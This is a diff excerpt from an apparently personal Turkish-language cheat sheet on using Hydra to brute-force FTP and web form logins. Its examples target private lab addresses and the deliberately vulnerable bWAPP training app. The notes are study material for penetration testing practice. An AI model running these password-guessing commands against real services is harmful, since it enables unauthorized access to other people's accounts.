@@ -4,7 +4,7 @@ hydra -l user -P passlist.txt ftp://192.168.0.1
 
 WEB : 
 hydra <target ip> <http metod posty yada get> "<login işleminin gerçekleştiği path>:<html formunda gönderilen username name>:^USER^&<html formunda gönderilen şifre name>:^PASS^&form=<buton html name>:<sayfada elde edilen hata mesajı"> -L <username wordlisti> -P <şifre wordlisti>
-Örnek = hydra 10.10.10.1 http-form-post "BWAPP/login.php:login=^USER^&password=^PASS^&form=submit:invalid credential" -L worlist.txt -P wordlist.txt
+Örnek = hydra 192.168.50.129 http-form-post "/bWAPP/login.php:login=^USER^&password=^PASS^&form=submit:Invalid credentials or user not activated" -L user.txt -P pass.txt
 Örnek = hydra 10.10.10.1 http-form-post "BWAPP/login.php:login=^USER^&password=^PASS^&form=submit:F=invalid credential" -L worlist.txt -P wordlist.txt // Buradaki F=<herhangi bir error mesajı> sayfa içeriisnde geçen herhangi bir error mesajı geçiyorsa false döndürüür görmediği yerde şifreyi bulmadığını gösterir.
 
 
